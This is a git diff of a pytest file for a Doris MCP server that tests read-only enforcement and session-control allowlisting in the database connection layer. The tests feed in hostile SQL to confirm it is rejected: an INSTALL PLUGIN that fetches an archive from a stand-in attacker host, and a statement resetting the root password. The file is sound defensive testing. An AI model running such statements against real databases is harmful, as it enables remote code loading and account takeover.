@@ -25,6 +25,7 @@ from doris_mcp_server.utils.db import (
     DorisSessionCache,
     get_first_sql_keyword,
 )
+from doris_mcp_server.utils.query_runtime import QueryRuntimeFailure
 
 
 @pytest.fixture
@@ -214,7 +215,7 @@ class TestExecuteResultSetDetection:
             "/* leading block comment */ SELECT 1",
             "/*\n multi\n line\n*/\nSELECT 1",
             "  -- one\n  /* two */ \n  SELECT 1",
-            "(SELECT 1)",
+            "SELECT (1)",
             "WITH t AS (SELECT 1) SELECT * FROM t",
             "-- comment\nWITH t AS (SELECT 1) SELECT * FROM t",
             "SHOW TABLES",
@@ -228,7 +229,7 @@ class TestExecuteResultSetDetection:
             "block_comment_then_select",
             "multiline_block_comment",
             "mixed_whitespace_and_comments",
-            "parenthesized_select",
+            "parenthesized_expression",
             "with_cte",
             "comment_then_with_cte",
             "show",
@@ -284,13 +285,60 @@ class TestExecuteResultSetDetection:
         )
         security_manager.apply_data_masking.assert_not_awaited()
 
+    async def test_mutation_is_rejected_without_auth_or_security_manager(self):
+        conn = _make_doris_connection(
+            cursor_description=None,
+            fetchall_rows=[],
+        )
+
+        with pytest.raises(QueryRuntimeFailure, match="not read-only"):
+            await conn.execute('INSTALL PLUGIN FROM "http://attacker.example/evil.zip"')
+
+        conn.connection.cursor.assert_not_awaited()
+
+    @pytest.mark.parametrize(
+        "sql",
+        [
+            "USE `analytics`",
+            "USE CATALOG `internal`",
+            "SWITCH `internal`",
+            "SET enable_profile=true",
+            'SET session_context="trace_id:0123456789abcdef0123456789abcdef"',
+        ],
+    )
+    async def test_internal_session_control_is_narrowly_allowlisted(self, sql):
+        conn = _make_doris_connection(
+            cursor_description=None,
+            fetchall_rows=[],
+        )
+        conn.security_manager = MagicMock()
+
+        await conn.execute(sql, internal_session_control=True)
+
+        conn.connection.cursor.return_value.execute.assert_awaited_once_with(sql, None)
+
+    async def test_internal_session_control_rejects_arbitrary_set_statement(self):
+        conn = _make_doris_connection(
+            cursor_description=None,
+            fetchall_rows=[],
+        )
+        conn.security_manager = MagicMock()
+
+        with pytest.raises(ValueError, match="approved internal session-control"):
+            await conn.execute(
+                "SET PASSWORD FOR 'root' = PASSWORD('pwned')",
+                internal_session_control=True,
+            )
+
+        conn.connection.cursor.assert_not_awaited()
+
     @pytest.mark.parametrize(
         "sql, affected",
         [
-            ("INSERT INTO t VALUES (1)", 1),
-            ("UPDATE t SET x = 1", 5),
-            ("DELETE FROM t WHERE x = 1", 3),
-            ("CREATE TABLE t (x INT)", 0),
+            ("SELECT 1", 1),
+            ("SHOW TABLES", 5),
+            ("DESCRIBE t", 3),
+            ("EXPLAIN SELECT 1", 0),
         ],
     )
     async def test_no_fetch_when_driver_reports_no_result_set(self, sql, affected):
@@ -314,7 +362,7 @@ class TestBoundedResultFetch:
         )
 
         result = await conn.execute(
-            "WITH data AS (...) SELECT * FROM data",
+            "WITH t AS (SELECT 1 AS id) SELECT * FROM t",
             max_rows=2,
             max_bytes=4096,
         )
@@ -375,7 +423,7 @@ class TestBoundedResultFetch:
         cursor.execute.side_effect = never_returns
         task = asyncio.create_task(
             conn.execute(
-                "SELECT SLEEP(30)",
+                "SELECT 1",
                 max_rows=1,
                 max_bytes=4096,
             )
